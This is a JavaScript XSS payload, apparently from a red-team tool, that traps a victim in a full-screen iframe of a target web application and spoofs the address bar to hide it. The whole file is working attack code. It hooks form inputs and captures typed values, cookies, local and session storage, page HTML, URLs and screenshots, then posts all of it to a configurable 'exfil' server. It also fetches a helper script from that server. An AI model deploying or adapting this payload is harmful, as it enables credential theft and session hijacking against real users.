//alert('Ready to launch trap?');




// Ue fullscreen for actual prod usage
// not fullscreen shows the XSS laden landing
// page in the background so you can 
// tell if you're still where you need to be during
// development. 
let fullscreenIframe = true; // Set to true for production use, false for dev

// Whether or not to copy screenshots to background
// Can make transitions smoother. Sometimes the
// background page of the iFrame trap flashes through
// when navigating the app. This hides that a bit
// by copying the image to the background
let setBackgroundImage = true;

// What page in the application to start users in
// Note that if the trap is loading from
// a reload, it hopefully will automatically
// load the page the user was on in the iframe
// when they reloaded the page. Otherwise,
// they'll start here
let startingPage = "https://targetapp.possiblymalware.com/wp-admin";


// Exfil server
let exfilServer = "http://localhost:8444";

// Should we exfil the entire HTML code?
let exfilHTML = true;



// Helpful variables
let lastFakeUrl = "";


// Slow down the html2canvas
let loaded = false;


// Client session
var sessionName = "";

// Cookie storage
var cookieStorageDict = {};


// Local storage
var localStorageDict = {};


// Session storage
var sessionStorageDict = {};


// Values for client session identifiers
const AdjectiveList = [
	"funky",
	"smelly",
	"skunky",
	"merry",
	"whimsical",
	"amusing",
	"hysterical",
	"bumfuzzled",
	"bodacious",
	"absurd",
	"animated",
	"brazen",
	"cheesy",
	"clownish",
	"confident",
	"crazy",
	"cuckoo",
	"deranged",
	"ludicrous",
	"playful",
	"quirky",
	"screwball",
	"slapstick",
	"wacky",
	"excited",
	"humorous",
	"charming",
	"confident",
	"fanatical"
	];

const ColorList = [
	"blue",
	"red",
	"green",
	"white",
	"black",
	"brown",
	"azure",
	"pink",
	"yellow",
	"silver",
	"purple",
	"orange",
	"grey",
	"fuchsia",
	"crimson",
	"lime",
	"plum",
	"olive",
	"cyan",
	"ivory",
	"magenta"
	];

const MurderCritter = [
	"kangaroo",
	"koala",
	"dropbear",
	"wombat",
	"wallaby",
	"dingo",
	"emu",
	"tassiedevil",
	"platypus",
	"salty",
	"kookaburra",
	"boxjelly",
	"blueringoctopus",
	"taipan",
	"stonefish",
	"redback",
	"cassowary",
	"funnelwebspider",
	"conesnail"
	];



// *******************************************************************************

function canAccessIframe(iframe) {
  try {
    return Boolean(iframe.contentDocument);
  }
  catch(e){
    return false;
  }
}


// Generate a session identifier
function initSession()
{
	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
	sessionName = adjective + "-" + color + "-" + murderer;
}



// Snag a screenshot and ship it
function sendScreenshot()
{
	if (loaded == false)
	{
		console.log("!!! Waiting 3 seconds to init html2canvas!");
		setTimeout(function () {}, 3000);
		loaded = true;
	}
	// console.log("---Snagging screenshot...");

	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	{
		function responseHandler() 
		{
			console.log(this.responseText)
		};

		//console.log("About to send image....");
		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
		request.open("POST", exfilServer + "/loot/screenshot/" + sessionName);


		// Helps hide flashing of the page when clicking around
		if (setBackgroundImage)
		{
			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
			document.body.style.backgroundRepeat = "no-repeat";
			document.body.style.backgroundSize = "auto";
		}


		canvas.toBlob((blob) => 
		{
			const image = blob;
			request.send(image);
		});
	}).catch(e => console.log(e));
}





// Hook all the inputs so we can capture what was typed
// Called a lot to make sure we don't miss some input
// Code checks (attributes) makes sure we don't register 
// events multiple times
function hookInputs()
{
	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
	for (index = 0; index < inputs.length; index++)
	{
		// Check to see if we've already hooked the input field. 
		// We can just use our own custom attribute to track, if it's
		// already hooked then skip it. If that attribute is missing, something happened
		// like a page change, but maybe the actual URL didn't change. 
		if (inputs[index].getAttribute("tappedState") != "true")
		{
			//console.log("!! Setting tappedState attribute on element index: " + index);
			inputs[index].setAttribute("tappedState", "true");

			// Adding event listeners to fire when the value in submitted 
			addEventListener(inputs[index], (event) => updateInput);
			inputs[index].addEventListener("change", function(){
				inputName = this.name;
				inputValue = this.value;
				request = new XMLHttpRequest();
				request.open("POST", exfilServer + "/loot/input/" + sessionName);
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				var jsonObj = new Object();
				jsonObj["inputName"] = inputName;
				jsonObj["inputValue"] = inputValue;
				var jsonString = JSON.stringify(jsonObj);
				request.send(jsonString);
			});
		}
	}
}



// Check for cookies, see if values
// have been added or changed
// Only update backend if new cookie or value changed.
function checkCookies()
{
	cookieArray = document.cookie.split(';');
	for (index = 0; index < cookieArray.length; index++)
	{
		// console.log("++ Cookie loop: " + index);
		cookieData = cookieArray[index].split('=');
		// console.log("cookieName: " + cookieData[0]);
		// console.log("cookieValue: " + cookieData[1]);

		cookieName = cookieData[0];
		cookieValue = cookieData[1];
		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
		if (cookieName in cookieStorageDict)
		{
			// console.log("== Existing cookie: " + cookieName);
			if (cookieStorageDict[cookieName] != cookieValue)
			{
				// Existing cookie, but the value has changed
				// console.log("     New cookie value: " + cookieValue);
				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
				cookieStorageDict[cookieName] = cookieValue;
			}
			else
			{
				// Existing cookie, but no change in value to report
				// console.log("     Cookie value unchanged");
				continue;
			}
		}
		else 
		{
			// New cookie detected
			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
			cookieStorageDict[cookieName] = cookieValue;
		}

		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", exfilServer + "/loot/dessert/" + sessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["cookieName"] = cookieName;
		jsonObj["cookieValue"] = cookieValue;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}


// Check for local storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkLocalStorage()
{
	for (index = 0; index < localStorage.length; index++)
	{
		key = localStorage.key(index)
		value = localStorage.getItem(key)
		//console.log("~~~ Local storage: {" + key + ", " + value + "}");

		if (key in localStorageDict)
		{
			// Existing local storage key
			//console.log("!!! Existing localstorage key...");
			if (localStorageDict[key] != value)
			{
				// Existing localStorage, but the value has changed
				// console.log("     New localStorage value: " + value);
				// console.log("     Old localStorage value: " + localStorageDict[key]);
				localStorageDict[key] = value;
			}
			else
			{
				// Existing cookie, but no change in value to report
				//console.log("     localStorgae value unchanged");
				continue;
			}

		}
		else
		{
			// New localStorage entry
			//console.log("++ New localStorage: " + key + ", with value: " + value);
			localStorageDict[key] = value;
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", exfilServer + "/loot/localstore/" + sessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Check for session storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkSessionStorage()
{
	for (index = 0; index < sessionStorage.length; index++)
	{
		key = sessionStorage.key(index)
		value = sessionStorage.getItem(key)
		// console.log("~~~ Session storage: {" + key + ", " + value + "}");

		if (key in sessionStorageDict)
		{
			// Existing local storage key
			//console.log("!!! Existing localstorage key...");
			if (sessionStorageDict[key] != value)
			{
				// Existing localStorage, but the value has changed
				 // console.log("     New sessionStorage value: " + value);
				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
				sessionStorageDict[key] = value;
			}
			else
			{
				// Existing sessionStorage, but no change in value to report
				// console.log("     sessionStorage value unchanged");
				continue;
			}

		}
		else
		{
			// New localStorage entry
			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
			sessionStorageDict[key] = value;
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", exfilServer + "/loot/sessionstore/" + sessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Optional, copy the entire HTML and send out
function sendHTML()
{
	trapURL = document.getElementById("iframe_a").contentDocument.location.href;
	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;

	request = new XMLHttpRequest();
	request.open("POST", exfilServer + "/loot/html/" + sessionName);
	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	var jsonObj = new Object();
	jsonObj["url"] = trapURL;
	jsonObj["html"] = trapHTML;
	var jsonString = JSON.stringify(jsonObj);
	request.send(jsonString);
}



// When this update fires, it checks the iframe trap URL
// where the user thinks they are, then does a lot of things
// Steals inputs, URL, screenshots, etc. 
// Also updates their browser address bar so they 
// think they're on the page they're viewing in the
// iframe trap, not the one with the XSS vuln. 
function runUpdate()
{
	// iFrame trap disable code
	if (!canAccessIframe(document.getElementById("iframe_a")))
	{
		// If we can't access the iframe anymore, that 
		// means the iframe has changed origin. They 
		// surfed away to a new domain, probably through a link
		// 
		// This is bad, the new page won't load in the iframe trap
		// and will throw very obvious errors on their page
		// indicating something isn't right  
		//
		// Safest thing is the kill the iframe trap and hope
		// no one notices. We'll reload the parent page to the current 
		// iframe page. It'll seem like clicking the link to the 
		// external page didn't work, but the second click will. 
		// First click exits the iframe, reloads the normally. 
		// Second click will properly load the external page. 
		// Sad to lose the trap through. 
		window.location = lastFakeUrl;
	}



	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
	var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
	// console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);

	// New page, let's steal stuff
	if (lastFakeUrl != fakeUrl)
	{
		// Handle URL recording
		console.log("New trap URL, stealing the things: " + fakeUrl);
		lastFakeUrl = fakeUrl;

		// This needs an API call to report the new page
		// and take a screenshot maybe, not sure if
		// screenshot timing will be right yet
		request = new XMLHttpRequest();
		request.open("POST", exfilServer + "/loot/location/" + sessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["url"] = fullUrl;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);

		// Handle screenshotting
		sendScreenshot();

		// Handle input scraping
		hookInputs();

		// Exfil HTML code
		if (exfilHTML)
		{
			sendHTML();
		}
	}




	// Updates that need to happen constantly
	// hooking inputs, we can miss them otherwise
	// hookInputs intelligently knows whether inputs
	// need to be rehooked or not
	hookInputs();


	// Handle Cookies
	// Will only report when new cookies found, or values change. 
	checkCookies();


	// Check local storage
	// Will only report when new or changed data found
	checkLocalStorage();


	// Check session storage
	// Will only report when new or changed data found
	checkSessionStorage();


	// Fake the URL that the user sees. This is important. 
	window.history.replaceState(null, '', fakeUrl);
}






// Start the trap
function takeOver()
{

	//document.body.style.backgroundColor = "pink";
	//document.innerHTML = "";

	// Setup our iframe trap
	var iframe = document.createElement("iframe");
	iframe.setAttribute("src", startingPage);
	iframe.setAttribute("style", "border:none");

	if (fullscreenIframe)
	{
		console.log("&& Using fullscreen");
		iframe.style.width  = "100%";
		iframe.style.height = "100%";
		iframe.style.top = "0px";
		iframe.style.left = "0px"
	}
	else
	{
		console.log("&& Using partial screen");
		iframe.style.width  = "80%";
		iframe.style.height = "80%";
		iframe.style.top = "50px";
		iframe.style.left = "50px";
	}
	iframe.style.position = "fixed";
	iframe.id = "iframe_a";
	document.body.appendChild(iframe);


	// Hook needed events below...

	// Just register all the darned events, each event in the iframe
	// we'll call runUpdate()
	var myIframe = document.getElementById('iframe_a');

	// Hook all the things for URL faking
	for(var key in myIframe){
		if(key.search('on') === 0) {
			myIframe.addEventListener(key.slice(2), runUpdate);
		}
	}

}

// ********************************************
// Go time

// Blank the page so it doesn't show through as users 
// navigate inside the iframe
document.body.innerHTML = "";
document.body.outerHTML = "";


// Pull in html2canvas
var js = document.createElement("script");
js.type = "text/javascript";
js.src = exfilServer + "/lib/telemhelperlib.js";
document.body.appendChild(js);


// Pull in jszip
// js = document.createElement("script");
// js.type = "text/javascript";
// js.src = "http://localhost:8444/lib/compress.js";
// document.body.appendChild(js);


// Pick our session ID
initSession();



// Trap all the things
takeOver();
